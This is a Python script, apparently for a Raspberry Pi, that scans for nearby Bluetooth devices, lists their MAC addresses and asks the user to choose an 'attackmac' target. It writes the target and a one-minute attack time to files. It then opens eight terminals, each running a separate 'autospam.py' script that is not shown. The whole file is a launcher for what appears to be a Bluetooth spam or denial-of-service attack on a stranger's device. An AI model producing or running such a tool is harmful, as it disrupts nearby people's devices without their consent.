# I got all in /home/pi - change directories if put somewhere else
import bluetooth
import sys
import serial
import os
import time
import subprocess

attacktime = 1*60		#one minute, you can change that
attacktimestr = str(attacktime)
path = 'attacktime.txt'		#you need to create this file, I've been to lazy letting it create one and then check every time if its there
atk_file = open(path, 'w')
atk_file.write(attacktimestr)
atk_file.close()


#scanning for bluetooth devices
os.system("sudo hcitool scan --length=3")
print("")

#inquiring bluetooth devices, used to key out mac adress
cmd = ["hcitool", "inq"]
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE)
output, _ = proc.communicate()
newoutput = ""
newoutput = str(output)

print("1:",(newoutput[19:36]))
mac1=(newoutput[19:36])
print("2:",(newoutput[79:96]))
mac2=(newoutput[79:96])
print("3:",(newoutput[139:156]))
mac3=(newoutput[139:156])
print("4:",(newoutput[199:216]))
mac4=(newoutput[199:216])
print("5:",(newoutput[259:276]))
mac5=(newoutput[259:276])
print("6:",(newoutput[319:336]))
mac6=(newoutput[319:336])
print("7:",(newoutput[379:396]))
mac7=(newoutput[379:396])
print("8:",(newoutput[439:456]))
mac8=(newoutput[439:456])
print("9:",(newoutput[499:516]))
mac9=(newoutput[499:516])

print("")
print("c-cancel")
userinput = input('which MAC (1-9 or "c"):')
print(userinput)

#handle for user input
if userinput == "c":
    os.system("clear")
    os.system("quit()")
elif userinput == "1":
    attackmac = mac1
elif userinput == "2":
    attackmac = mac2
elif userinput == "3":
    attackmac = mac3
elif userinput == "4":
    attackmac = mac4
elif userinput == "5":
    attackmac = mac5
elif userinput == "6":
    attackmac = mac6
elif userinput == "7":
    attackmac = mac7
elif userinput == "8":
    attackmac = mac8
elif userinput == "9":
    attackmac = mac9

path = 'mac.txt'					#you need to create this file, I've been to lazy letting it create one and then check every time if its there
mac_file = open(path, 'w')
mac_file.write(attackmac)
mac_file.close()

command=("python3 autospam.py")
os.system("lxterminal --command=" + "'" + command + "'" + "&")
os.system("lxterminal --command=" + "'" + command + "'" + "&")
os.system("lxterminal --command=" + "'" + command + "'" + "&")
os.system("lxterminal --command=" + "'" + command + "'" + "&")
os.system("lxterminal --command=" + "'" + command + "'" + "&")
os.system("lxterminal --command=" + "'" + command + "'" + "&")
os.system("lxterminal --command=" + "'" + command + "'" + "&")
os.system("lxterminal --command=" + "'" + command + "'" + "&")


a = input("just hit enter to close, its to find errors ")
